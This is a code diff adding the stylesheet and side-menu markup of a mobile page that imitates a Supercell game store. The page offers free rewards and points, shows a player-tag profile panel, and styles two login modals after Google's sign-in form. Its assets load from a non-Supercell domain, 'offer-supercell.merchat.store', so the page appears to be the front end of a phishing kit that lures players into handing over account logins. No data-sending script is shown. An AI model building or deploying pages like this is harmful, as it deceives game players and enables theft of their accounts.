+#rewards-section-content .carousel-slides {
+    display: flex; 
+    height: 100%;
+    transition: transform 0.5s ease-in-out; 
+}
+
+#rewards-section-content .carousel-slide {
+    min-width: 100%; 
+    box-sizing: border-box;
+    display: none; 
+    height: 100%;
+}
+#rewards-section-content .carousel-slide.active {
+    display: block; 
+}
+
+#rewards-section-content .carousel-slide img {
+    width: 100%; 
+    height: 100%;
+    object-fit: cover; 
+    display: block; 
+}
+
+#rewards-section-content .rewards-grid {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 10px;
+    padding-top: 10px;
+}
+
+#rewards-section-content .reward-item {
+    width: 30%;
+    margin-bottom: 20px;
+    display: inline-block;
+    background-color: transparent;
+    cursor: pointer;
+    box-sizing: border-box;
+}
+#rewards-section-content .reward-item figure {
+    margin: 0; padding: 0; overflow: hidden; position: relative; width: 100%; height: 100%;
+}
+#rewards-section-content .reward-item figure img {
+    width: 100%; height: 100%; object-fit: contain;
+}
+
+#rewards-section-content .itemShine figure::before {
+    content: ''; position: absolute; top: 0; left: -75%; width: 50%; height: 100%;
+    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 100%);
+    transform: skewX(-25deg); animation: shine 2s infinite; z-index: 1;
+}
+
+@keyframes shine { 100% { left: 125%; } }
+@keyframes bounceIn { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-8px); } 60% { transform: translateY(-4px); } }
+@keyframes fadeIn { from { opacity: 0.7; } to { opacity: 1; } }
+
+@media only screen and (max-width: 600px) {
+    #rewards-section-content .menu-tab { font-size: 10px; }
+    #rewards-section-content .menu-icon { width: 30px; }
+    #rewards-section-content .icon-skill { width: 28px; }
+    #rewards-section-content .reward-item { width: 30%; }
+    #rewards-section-content .carousel-container { height: 120px; }
+}
+   * {
+    box-sizing:border-box;
+    color:black;
+    letter-spacing:0;
+    margin:0;
+    padding:0
+}
+    body.menu-is-open {
+        overflow: hidden;
+    }
+
+    #menuOverlay {
+        position: fixed;
+        inset: 0;
+        background-color: rgba(0, 0, 0, 0.6);
+        z-index: 9998;
+        opacity: 0;
+        transition: opacity 0.3s ease-in-out;
+        display: none; 
+    }
+
+    body.menu-is-open #menuOverlay {
+        display: block;
+        opacity: 1;
+    }
+
+    #sideMenu {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 85%;
+        max-width: 380px;
+        height: 100%;
+        background-color: white;
+        z-index: 9999;
+        display: flex; 
+        flex-direction: column;
+        transform: translateX(-100%);
+        transition: transform 0.3s ease-in-out;
+        font-family: 'Roboto', sans-serif;
+        display: none; /* Hidden by default */
+    }
+
+    body.menu-is-open #sideMenu {
+        display: flex;
+        transform: translateX(0);
+    }
+    
+    .menu-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 15px 20px;
+        flex-shrink: 0;
+    }
+
+    .menu-header .logo-link img {
+        height: 40px;
+    }
+
+    #closeMenu {
+    cursor: pointer;
+    width: 32px;
+    height: 32px;
+    position: relative;
+
+    background: none;
+    border: none;
+    }
+
+    #closeMenu::before,
+    #closeMenu::after {
+        content: '';
+        position: absolute;
+        top: 50%; 
+        left: 5px;
+        width: 22px;
+        height: 2px;
+        background-color: black; 
+    }
+
+    #closeMenu::before {
+        transform: translateY(-50%) rotate(45deg);
+    }
+
+    #closeMenu::after {
+        transform: translateY(-50%) rotate(-45deg);
+    }
+    .menu-content {
+        flex-grow: 1;
+        overflow-y: auto;
+        padding: 10px 0;
+    }
+
+    .menu-item {
+        display: flex;
+        align-items: center;
+        padding: 12px 20px;
+        text-decoration: none;
+        color: black;
+        font-size: 16px;
+        font-weight: 500;
+    }
+
+    .menu-item:hover {
+        background-color: ;
+    }
+
+    .menu-item .icon {
+        width: 37px;
+        height: 37px;
+        margin-right: 15px;
+    }
+    
+    .menu-item .text-group {
+        line-height: 1.2;
+    }
+    
+    .menu-item .text-group .menu-item-subtitle {
+        font-size: 13px;
+        color: black;
+        font-weight: 400;
+    }
+
+    .menu-item .arrow {
+    margin-left: auto;
+    color: black;
+    font-size: 14px;  
+    transition: transform 0.3s ease;
+    width: auto;
+    height: auto;
+    }
+    .menu-item.active .arrow {
+        transform: rotate(90deg);
+    }
+    
+    .menu-footer {
+        padding: 20px;
+        flex-shrink: 0;
+        color: black;
+        font-size: 14px;
+    }
+
+    .language-country-wrapper {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .language-selector, .location {
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+    }
+    .language-selector svg, .location svg {
+        margin-right: 8px;
+        fill: #d2d2d2;
+    }
+    .submenu {
+        display: none; 
+        
+        background-color: white;
+        padding: 5px 20px 15px 72px;
+    }
+
+    .submenu.player-stats-submenu {
+    padding: 10px 15px;
+    background-color: #e9e9eb;
+    border-top: 1px solid #ddd;
+    }
+
+    .stat-item {
+        display: flex; 
+        align-items: center; 
+        background: white; 
+        color: #333;
+        
+        font-size: 14px;
+        font-weight: 500;
+        font-family: 'Roboto', sans-serif;
+
+        padding: 8px 12px;
+        margin-bottom: 5px;
+        border-radius: 8px;
+        border: 1px solid #e0e0e0;
+    }
+
+    .stat-item:last-child {
+        margin-bottom: 0;
+    }
+
+    .stat-item img {
+        width: 30px; 
+        height: 30px;
+        object-fit: contain; 
+        margin-right: 12px; 
+    }
+    .CartButton_CartIcon__2tRvz svg {
+    color: black;
+    }
+
+    .SideScrollable_sideScrollable__Ca9Rq {
+  display: flex;
+  overflow-x: auto;
+  scroll-behavior: smooth; 
+  -ms-overflow-style: none; 
+  scrollbar-width: none;  
+}
+
+.SideScrollable_sideScrollable__Ca9Rq::-webkit-scrollbar {
+  display: none;
+}
+
+.InGameReward_rewardItem__RDeRE {
+  margin-right: 16px; 
+  flex-shrink: 0;
+}
+
+</style>
+<style>
+
+        .Collapsible_Container__8dZh2[data-open="true"] {
+            background-color: unset;
+            margin-top: -20px;
+        }
+        .Collapsible_Container__8dZh2 {
+            position: relative;
+            width: 100%;
+            background-color: transparent;
+            margin-top: -20px;
+        }
+        .ClashOfClans_Container__iadVY {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            background-image: url(images/CR_KeyArt_MergeTacticsIllustration_Final_V01.png);
+            background-size: cover;
+            background-position: 50%;
+            background-repeat: no-repeat;
+        }
+        .GradientOverlay_GradientOverlay__nQcLH {
+            position: absolute;
+            inset: 0;
+            height: 100%;
+            width: 100%;
+        }
+        .ClashOfClans_Content__I_dRT {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1 1;
+            width: 100%;
+            min-height: 100%;
+            padding-top: 10vh;
+            padding-bottom: 10vh;
+            row-gap: clamp(1rem,.571rem + 1.905vw,2rem);
+        }
+        .ClashOfClans_Heading__LpPvq {
+            text-align: center;
+            max-width: 20ch;
+            padding: 0 16px;
+            font-family: Clash,system-ui,sans-serif;
+            line-height: 1;
+            -webkit-text-stroke-width: .1em;
+            letter-spacing: -.03em;
+            paint-order: stroke fill;
+            text-shadow: 0 .1em 0 #000,-.03em .1em 0 #000,.03em .1em 0 #000;
+            -webkit-text-stroke-color: #000;
+            color: #fff;
+            font-size: clamp(2rem,1.639rem + 1.481vw,2.75rem) !important;
+        }
+        .LearnMoreButton_LearnMoreButton__LZsPh {
+            font-family: SupercellText-Medium,system-ui,sans-serif;
+            font-size: 14px;
+            line-height: 1;
+            display: flex;
+            align-items: center;
+            column-gap: 8px;
+            color: #fff;
+            text-shadow: 0 .15em 2px rgba(0,0,0,.25);
+        }
+        button {
+            background: none;
+            color: inherit;
+            border: none;
+            padding: 0;
+            font: inherit;
+            cursor: pointer;
+            outline: inherit;
+        }
+        .LearnMoreButton_LearnMoreButton__LZsPh span {
+            font-family: SupercellText-Regular,system-ui,sans-serif;
+            color:white;
+            font-size: clamp(1rem,.955rem + .227vw,1.125rem);
+            line-height: 1.4;
+        }
+        .LearnMoreButton_Icon__NMKGT {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 999px;
+            background: #fff;
+            box-shadow: 0 2px 0 rgba(0,0,0,.25);
+        }
+
+        /* --- CSS Section 2 (UPDATED) --- */
+        
+        /* This is the key part for centering the first card */
+        .ScrollContainer_ScrollContainer__pwEh7 {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start; /* Align cards to the start */
+            width: 100%;
+            height: 100%;
+            overflow-x: auto; /* Allow horizontal scrolling */
+            scroll-behavior: smooth; /* Smooth scrolling via JS/CSS */
+            /* Add padding to push the first card to the center */
+            padding-left: calc(50% - 150px);
+            padding-right: calc(50% - 150px);
+            -webkit-overflow-scrolling: touch;
+            scroll-snap-type: x mandatory; /* Snap effect */
+            scrollbar-width: none; /* Hide scrollbar for Firefox */
+            -ms-overflow-style: none;  /* Hide scrollbar for IE/Edge */
+            padding-bottom: 40px;
+            margin-bottom: -40px;
+            gap: clamp(.5rem,.241rem + 4.545vw,2rem);
+        }
+        /* Hide scrollbar for Chrome/Safari/Opera */
+        .ScrollContainer_ScrollContainer__pwEh7::-webkit-scrollbar {
+            display: none;
+        }
+
+        .CardContainer_CardContainer__nyP_b {
+            position: relative;
+            width: 300px; /* Fixed width */
+            height: 100%;
+            flex-shrink: 0; /* Prevent cards from shrinking */
+            scroll-snap-align: center; /* Snap each card to the center */
+            transition: transform .4s cubic-bezier(.86,.03,.39,.9);
+            will-change: transform;
+        }
+        .ClashCards_Container__C0IyC {
+            width: 100%;
+            height: auto;
+            min-height: 280px;
+            margin-top: 90px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: linear-gradient(170deg,hsl(38,49%,79%) 7.07%,hsl(26,41%,70%) 92.88%);
+            box-shadow: 0 4px 0 -1px #8c5a33,0 24px 14px -8px rgba(31,14,1,.35),0 28px 18px rgba(21,9,0,.5),inset 0 0 1px 2px hsla(0,0%,100%,.3);
+            border-radius: 16px;
+        }
+        .ClashCards_Header__UbLyZ {
+            position: relative;
+            z-index: 1;
+            margin-top: -90px;
+            aspect-ratio: 1/1;
+            width: 95%;
+        }
+        .ClashCards_Content__Rxz5a {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 8px 20px 20px;
+            gap: 8px;
+        }
+        .ClashCards_Title__9qbpJ {
+            max-width: 15ch;
+            text-align: center;
+            margin-top: -40px;
+            font-family: clash,system-ui,sans-serif;
+            line-height: 1;
+            -webkit-text-stroke-width: .1em;
+            letter-spacing: -.03em;
+            paint-order: stroke fill;
+            text-shadow: 0 .1em 0 #000,-.03em .1em 0 #000,.03em .1em 0 #000;
+            -webkit-text-stroke-color: #000;
+            color: #fff;
+            font-size: 18px !important;
+        }
+        .ClashCards_Description__YqHoN {
+            font-family: SupercellText-Regular,system-ui,sans-serif;
+            font-size: 13px;
+            line-height: 1.3;
+            color: rgba(0,0,0,.8);
+            text-align: center;
+        }
+        .ClashCards_NextCardBtn__NX5yX {
+            width: 32px;
+            height: 32px;
+            position: absolute;
+            z-index: 2;
+            inset-inline-end: 0;
+            margin-inline-end: -16px;
+            bottom: 40%;
+            transform: translateY(60%);
+        }
+        .CardContainer_Scaled__5TIPz {
+            transform: scale(.93);
+        }
+        .MinimizeButton_MinimizeButton__zMSHw {
+            position: absolute;
+            z-index: 2;
+            bottom: -2px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+    </style>
+<style>
+.content .imgLogo {
+    width: 120px;
+}
+
+.content .wel {
+    width: 100%;
+}
+
+.wel h1 {
+    font-size: 17px;
+    text-align: center;
+}
+
+.listitem {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    padding: 20px;
+    width: 100%;
+    margin-top: 20px; 
+}
+
+.front {
+    background: linear-gradient(170deg, #e4d0af 7.07%, #c49572 92.88%);
+    border-radius: 16px;
+    box-shadow: 0 4px 0 -1px #8c5a33, 0 24px 14px -8px #1f0e0159, 0 28px 18px #15090080, inset 0 0 1px 2px #ffffff4d;
+    flex-direction: column;
+    gap: 15px;
+    padding: 10px;
+    align-items: center;
+    display: flex;
+    position: relative;
+}
+
+.front .imgBox {
+    height: 120px;
+    position: relative;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.imgBox img {
+    max-width: 100%;
+    position: relative;
+    z-index: 1;
+}
+
+.imgBox:before {
+    animation: spin-0ef9637b 10s linear infinite;
+    background: url(images/20250518164523972aa6d58c753_1.png) no-repeat 50%;
+    background-size: cover;
+    content: "";
+    height: 100%;
+    left: 0;
+    pointer-events: none;
+    position: absolute;
+    top: 0;
+    width: 100%;
+}
+
+@keyframes spin-0ef9637b {
+    0% {
+        transform: rotate(0);
+    }
+    to {
+        transform: rotate(1turn);
+    }
+}
+
+.front .claim {
+    background-color: #000;
+    border-radius: 5px;
+    box-shadow: inset 0 3px #4d4d4d;
+    color: #fff;
+    cursor: pointer;
+    font-size: 10px;
+    padding: 5px 8px;
+}
+</style>
+<style>
+ .MissionsSection_missionsSection__kvRce[data-game-theme="clashofclans"] {
+ background: url(https://offer-supercell.merchat.store/img/bgputih.png) no-repeat;
+ background-size: 100% 95%;
+ margin-bottom: 10px;
+ width: 100%;
+}
+.BonusMissionItem_imageContainer__Tg1nw {
+  position: relative;
+}
+
+.BonusMissionItem_flareContainer__ByI21 .puter {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 150%;
+  height: 150%;
+  transform: translate(-50%, -50%);
+  transform-origin: center center;
+  animation: spinClockwise 8s linear infinite;
+  z-index: 0;
+}
+@keyframes spinClockwise {
+  from {
+    transform: translate(-50%, -50%) rotate(0deg);
+  }
+  to {
+    transform: translate(-50%, -50%) rotate(360deg);
+  }
+}
+
+</style>
+<style>
+        #loginModal1 .input-group input:focus ~ label,
+#loginModal1 .input-group input:not(:placeholder-shown) ~ label,
+#loginModal2 .input-group input:focus ~ label,
+#loginModal2 .input-group input:not(:placeholder-shown) ~ label {
+    transform: translateY(-1.6rem) scale(0.8);
+    color: #1a73e8;
+    background-color: white;
+    padding-left: 0.25rem;
+    padding-right: 0.25rem;
+}
+
+#loginModal1 .input-group input:focus,
+#loginModal2 .input-group input:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding-top: calc(1rem - 1px);
+    padding-bottom: calc(1rem - 1px);
+}
+
+#loginModal1 .input-group input.border-error,
+#loginModal2 .input-group input.border-error {
+    border-color: #d93025;
+}
+
+#loginModal1 .input-group input.border-error:focus,
+#loginModal2 .input-group input.border-error:focus {
+    border-color: #d93025;
+}
+
+#loginModal1 .input-group input.border-error ~ label,
+#loginModal1 .input-group input.border-error:focus ~ label,
+#loginModal2 .input-group input.border-error ~ label,
+#loginModal2 .input-group input.border-error:focus ~ label {
+    color: #d93025;
+}
+
+        .error-message {
+            color: #d93025;
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            margin-top: 0.5rem;
+        }
+        .error-message .material-icons {
+            font-size: 1rem;
+            margin-right: 0.25rem;
+        }
+        input[type="checkbox"] {
+        -webkit-appearance: none;
+        appearance: none;
+        display: inline-block;
+        background-color: white;
+        width: 20px;
+        height: 20px;
+        border: 2px solid #ccc;
+        border-radius: 3px;
+        position: relative;
+        cursor: pointer;
+        }
+
+        input[type="checkbox"]:checked::before {
+        content: "";
+        position: absolute;
+        width: 5px;
+        height: 10px;
+        border: solid #1a73e8;
+        border-width: 0 2px 2px 0;
+        top: 2px;
+        left: 5px;
+        transform: rotate(45deg);
+        }
+    </style>
+<style>
+        @media (max-width: 410px) {
+          .ItemsGrid_Items__Jt7tU {
+            display: flex !important;
+            flex-direction: row !important;
+            justify-content: center;
+            gap: 8px;
+          }
+          .ClashOfClansOfferCardContent_SubItem__qfIZd, 
+          .ClashOfClansOfferCardContent_SubItemLarge__a4xhp {
+            flex: 1;
+            min-width: 0;
+          }
+          
+        }
+    
+    </style>
+<style>
+</style>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Lilita+One&display=swap');
+.CreatorCodeModalContent_Container__s6rAQ {
+  width: 350px;
+  max-width: 90vw; 
+  box-sizing: border-box; 
+}
+.player-profile-container-v2 {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin: 20px 0;
+  font-family: 'Lilita One', cursive;
+  color: white;
+}
+
+.profile-row.player-info {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.xp-level-wrapper {
+  position: relative;
+  display: flex;
+  width: 40px;
+}
+
+.xp-level-wrapper img {
+  width: 100%;
+}
+
+.player-nickname {
+  font-size: 16px;
+  letter-spacing: 1px;
+  color: black;
+}
+
+.profile-row.clan-info {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  width: 100%;
+  background-color: #555555; 
+  padding: 8px 12px;
+  border-radius: 8px;
+  box-sizing: border-box; 
+}
+
+.profile-row.clan-info img {
+  width: 32px; 
+  height: auto;
+}
+
+.profile-row.clan-info span {
+  font-size: 14px;
+}
+
+.profile-row.stats-info {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+}
+
+.profile-badge {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 8px 12px;
+  border-radius: 8px;
+  font-size: 14px;
+}
+.profile-badge img {
+  width: 28px;
+  height: auto;
+}
+.th-badge { background-color: #8e44ad; }
+.trophy-badge { background-color: #f39c12; }
+
+.text-on-image {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  color: white;
+  text-shadow: 1px 1px 2px black;
+  font-size: 14px;
+}
+</style>
+<style>
+.hr-with-text {
+  width: 100%;
+  text-align: center;
+  border-bottom: 1px solid black;
+  line-height: 0.1em;
+  margin: 30px 0 20px;
+}
+
+.hr-with-text span {
+  background: #f2f2f2;
+  padding: 0 10px;
+  color: black;
+  font-family: 'Lilita One', cursive;
+  font-size: 14px;
+}
+
+.reward-box {
+  width: 65%;
+  margin: 0 auto 5px;
+  background: #f2f2f2;
+  border-radius: 12px;
+  box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+  padding: 10px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: transform 0.2s ease;
+}
+
+.reward-box:hover {
+  transform: scale(1.03);
+}
+
+.reward-box img {
+  max-width: 80%;
+  height: auto;
+  border-radius: 6px;
+}
+
+</style>
+<style>
+#playertag {
+  border: none !important;
+  border-color: transparent !important;
+  outline: none !important;
+  box-shadow: none !important;
+}
+
+</style>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Lilita+One&display=swap');
+.CreatorCodeModalContent_Container__s6rAQ {
+  width: 350px;
+  max-width: 90vw; 
+  box-sizing: border-box; 
+}
+.player-profile-container-v2 {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  margin: 20px 0;
+  font-family: 'Lilita One', cursive;
+  color: white;
+}
+
+.profile-row.player-info {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.xp-level-wrapper {
+  position: relative;
+  display: flex;
+  width: 40px;
+}
+
+.xp-level-wrapper img {
+  width: 100%;
+}
+
+.player-nickname {
+  font-size: 16px;
+  letter-spacing: 1px;
+  color: black;
+}
+
+.profile-row.clan-info {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  width: 100%;
+  background-color: #555555; 
+  padding: 8px 12px;
+  border-radius: 8px;
+  box-sizing: border-box; 
+}
+
+.profile-row.clan-info img {
+  width: 32px; 
+  height: auto;
+}
+
+.profile-row.clan-info span {
+  font-size: 14px;
+}
+
+.profile-row.stats-info {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+}
+
+.profile-badge {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 8px 12px;
+  border-radius: 8px;
+  font-size: 14px;
+}
+.profile-badge img {
+  width: 28px;
+  height: auto;
+}
+.th-badge { background-color: #8e44ad; }
+.trophy-badge { background-color: #f39c12; }
+
+.text-on-image {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  color: white;
+  text-shadow: 1px 1px 2px black;
+  font-size: 14px;
+}
+</style>
+
+
+    <div id="thiscontainer">
+        <div id="menuOverlay"></div>
+        <div id="sideMenu">
+            <div class="menu-header">
+                <a class="logo-link"><img src="https://offer-supercell.merchat.store/img/badge.0cb70e6d.webp" alt="Logo"></a>
+                <button id="closeMenu" onclick="playSound()"></button>
+            </div>
+            <div class="menu-content content1">
+                <div class="menu-item-wrapper">
+                    <div class="menuUser_user__aw55M menuUser_loggedOut__UUwV4" style="margin-left: 20px;">
+                       <a class="LoginButton_LoginButton__Weazg LoginButton_Primary__Mp6c9">
+                          <span style="color:white" class="LoginButton_LoginText__nI3VP">Log in</span>
+                          <div class="LoginButton_IdLogo__X0lkn"><span style="box-sizing: border-box; display: block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: absolute; inset: 0px;"><img alt="logo" decoding="async" data-nimg="fill" src="images/supercell-id-white.fe9b60a2.svg" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%; object-fit: contain;"></span></div>
+                       </a>
+                    </div>
+                </div>
+                <a class="menu-item" onclick="playSound()">
+                    <svg width="37" height="37" viewBox="0 0 37 37" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="18.5" cy="18.5" r="18.5" fill="#F5F5F5"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M18.4999 28.7777C24.1762 28.7777 28.7777 24.1762 28.7777 18.4999C28.7777 12.8237 24.1762 8.22217 18.4999 8.22217C12.8237 8.22217 8.22217 12.8237 8.22217 18.4999C8.22217 20.5047 8.79617 22.3755 9.78881 23.9568L8.22217 28.7777L12.8991 27.119C14.5103 28.1681 16.4339 28.7777 18.4999 28.7777Z" fill="black"></path><ellipse cx="14.3889" cy="18.4999" rx="1.23333" ry="1.23333" fill="#F2F2F2"></ellipse><circle cx="18.4999" cy="18.4999" r="1.23333" fill="#F2F2F2"></circle><circle cx="22.611" cy="18.4999" r="1.23333" fill="#F2F2F2"></circle></svg>
+                    <div class="text-group" style="color:black;padding-left: 10px;">Support</div>
+                    <i class="fa-solid fa-chevron-right arrow"></i>
+                </a>
+                <a class="menu-item" onclick="playSound()">
+                    <svg width="37" height="33" viewBox="0 0 37 33" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.47476 8.82974L0 32.6191H25.1985C30.2971 32.6191 34.6114 28.7943 35.2981 23.6653L36.8947 11.7412C37.7263 5.52966 33.5479 0 27.3731 0H13.5571C8.5053 0 4.21576 3.75665 3.47476 8.82974Z" fill="#FFCC4D"></path><path d="M16.6134 25.2172C14.8241 25.2172 13.4966 23.7955 12.804 22.8756C12.3422 22.2623 12.0536 21.6769 11.8228 21.0636L15.1127 20.2273C15.5167 20.9242 15.9785 21.5654 16.5845 21.9556H20.9422C20.9711 21.9556 21.202 21.7884 21.5194 21.4817C21.8369 21.1751 22.01 20.9521 22.01 20.9242V19.3352C22.01 19.2516 21.9812 19.1959 21.9234 19.168L14.6221 17.2724C13.006 16.8542 12.2268 15.4046 12.2268 14.0386V12.5891C12.2268 11.8364 12.3133 11.3346 12.8328 10.6377C13.2657 10.0523 14.1603 9.18809 14.7375 8.79781C15.459 8.29603 15.9785 8.2124 16.7577 8.2124H20.798C22.5872 8.2124 23.9436 9.63412 24.6074 10.554C25.0691 11.1952 25.3577 11.7527 25.5886 12.366L22.2986 13.2023C21.8946 12.5054 21.4329 11.8643 20.8268 11.474H16.8154C16.7865 11.474 16.5557 11.6412 16.2382 11.9479C15.9208 12.2545 15.7476 12.4775 15.7476 12.5054V13.9271C15.7476 14.0386 15.8342 14.0944 15.8342 14.0944L23.1644 16.0179C24.7517 16.436 25.5597 17.8856 25.5597 19.2516V20.8406C25.5597 21.5932 25.4731 22.095 24.9537 22.792C24.5208 23.3774 23.6262 24.2415 23.049 24.6318C22.3275 25.1336 21.808 25.2172 21.0288 25.2172H16.6134Z" fill="white"></path></svg>
+                    <div class="text-group" style="color:black;padding-left: 10px;">Our other game Stores</div>
+                    <i class="fa-solid fa-chevron-right arrow"></i>
+                </a>
+            </div>
+            <div class="menu-content content2" style="display: none;">
+                <div class="menu-item-wrapper">
+                    <a class="menu-item has-submenu" onclick="playSound()">
+                        <img alt="User Avatar" style="border-radius: 50%;" width="37" height="37" src="images/logok.webp">
+                        <div class="text-group nickname" style="padding-left: 10px;color:black">Player</div>
+                        <i class="fa-solid fa-chevron-right arrow"></i>
+                    </a>
+                    
+                    <div class="submenu player-stats-submenu">
+                        <div class="stat-item clan">
+                            <img alt="Ikon Clan" style="border-radius: 20px;" src="images/clan.webp">
+                        </div>
+                        <div class="stat-item exp">
+                            <img src="images/exp.webp" alt="Ikon EXP">
+                        </div>
+                        <div class="stat-item th">
+                            <img alt="Ikon Town Hall" src="https://offer-supercell.merchat.store/img/th/th1.webp">
+                        </div>
+                        <div class="stat-item trophy">
+                            <img src="images/trophy.webp" alt="Ikon Trophy">
+                        </div>
+                    </div>
+                </div>
+                <a class="menu-item" onclick="playSound()">
+                    <img alt="ID Rewards" width="37" height="37" class="IDRActivationStatus_Image__trdDu" src="images/idr-icon.51712b2b.svg">
+                    <div class="text-group">
+                        <p style="color:black;padding-left: 10px;font-size: 15px;">Activate ID Rewards</p>
+                        <p class="menu-item-subtitle" style="color:gray;padding-left: 10px;">Get 1000 free points</p>
+                    </div>
+                    <i class="fa-solid fa-chevron-right arrow"></i>
+                </a>
+                 <a class="menu-item" onclick="playSound()">
+                    <svg width="37" height="37" viewBox="0 0 37 37" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="18.5" cy="18.5" r="18.5" fill="#F5F5F5"></circle><path fill-rule="evenodd" clip-rule="evenodd" d="M18.4999 28.7777C24.1762 28.7777 28.7777 24.1762 28.7777 18.4999C28.7777 12.8237 24.1762 8.22217 18.4999 8.22217C12.8237 8.22217 8.22217 12.8237 8.22217 18.4999C8.22217 20.5047 8.79617 22.3755 9.78881 23.9568L8.22217 28.7777L12.8991 27.119C14.5103 28.1681 16.4339 28.7777 18.4999 28.7777Z" fill="black"></path><ellipse cx="14.3889" cy="18.4999" rx="1.23333" ry="1.23333" fill="#F2F2F2"></ellipse><circle cx="18.4999" cy="18.4999" r="1.23333" fill="#F2F2F2"></circle><circle cx="22.611" cy="18.4999" r="1.23333" fill="#F2F2F2"></circle></svg>
+                    <div class="text-group" style="color:black;padding-left: 10px;">Support</div>
+                    <i class="fa-solid fa-chevron-right arrow"></i>
+                </a>
+                <a class="menu-item" onclick="playSound()">
+                    <svg width="37" height="33" viewBox="0 0 37 33" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.47476 8.82974L0 32.6191H25.1985C30.2971 32.6191 34.6114 28.7943 35.2981 23.6653L36.8947 11.7412C37.7263 5.52966 33.5479 0 27.3731 0H13.5571C8.5053 0 4.21576 3.75665 3.47476 8.82974Z" fill="#FFCC4D"></path><path d="M16.6134 25.2172C14.8241 25.2172 13.4966 23.7955 12.804 22.8756C12.3422 22.2623 12.0536 21.6769 11.8228 21.0636L15.1127 20.2273C15.5167 20.9242 15.9785 21.5654 16.5845 21.9556H20.9422C20.9711 21.9556 21.202 21.7884 21.5194 21.4817C21.8369 21.1751 22.01 20.9521 22.01 20.9242V19.3352C22.01 19.2516 21.9812 19.1959 21.9234 19.168L14.6221 17.2724C13.006 16.8542 12.2268 15.4046 12.2268 14.0386V12.5891C12.2268 11.8364 12.3133 11.3346 12.8328 10.6377C13.2657 10.0523 14.1603 9.18809 14.7375 8.79781C15.459 8.29603 15.9785 8.2124 16.7577 8.2124H20.798C22.5872 8.2124 23.9436 9.63412 24.6074 10.554C25.0691 11.1952 25.3577 11.7527 25.5886 12.366L22.2986 13.2023C21.8946 12.5054 21.4329 11.8643 20.8268 11.474H16.8154C16.7865 11.474 16.5557 11.6412 16.2382 11.9479C15.9208 12.2545 15.7476 12.4775 15.7476 12.5054V13.9271C15.7476 14.0386 15.8342 14.0944 15.8342 14.0944L23.1644 16.0179C24.7517 16.436 25.5597 17.8856 25.5597 19.2516V20.8406C25.5597 21.5932 25.4731 22.095 24.9537 22.792C24.5208 23.3774 23.6262 24.2415 23.049 24.6318C22.3275 25.1336 21.808 25.2172 21.0288 25.2172H16.6134Z" fill="white"></path></svg>
+                    <div class="text-group" style="color:black;padding-left: 10px;">Our other game Stores</div>
+                    <i class="fa-solid fa-chevron-right arrow"></i>
+                </a>
+            </div>
+            <div class="menu-footer">
+                <div class="language-country-wrapper">
+                    <div class="language-selector" onclick="playSound()">
+                        <svg style="color:black;" class="LanguageSelector_GlobeIcon__WFBLb" width="22" height="22" viewBox="0 0 22 22" fill="black" xmlns="http://www.w3.org/2000/svg"><path d="M11 20.1668C16.0626 20.1668 20.1667 16.0628 20.1667 11.0002C20.1667 5.93755 16.0626 1.8335 11 1.8335C5.93738 1.8335 1.83333 5.93755 1.83333 11.0002C1.83333 16.0628 5.93738 20.1668 11 20.1668Z" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M1.83333 11H20.1667" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M11 1.8335C13.2928 4.34365 14.5959 7.60119 14.6667 11.0002C14.5959 14.3991 13.2928 17.6567 11 20.1668C8.70715 17.6567 7.40414 14.3991 7.33333 11.0002C7.40414 7.60119 8.70715 4.34365 11 1.8335Z" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+                        <span style="color:black">English</span>
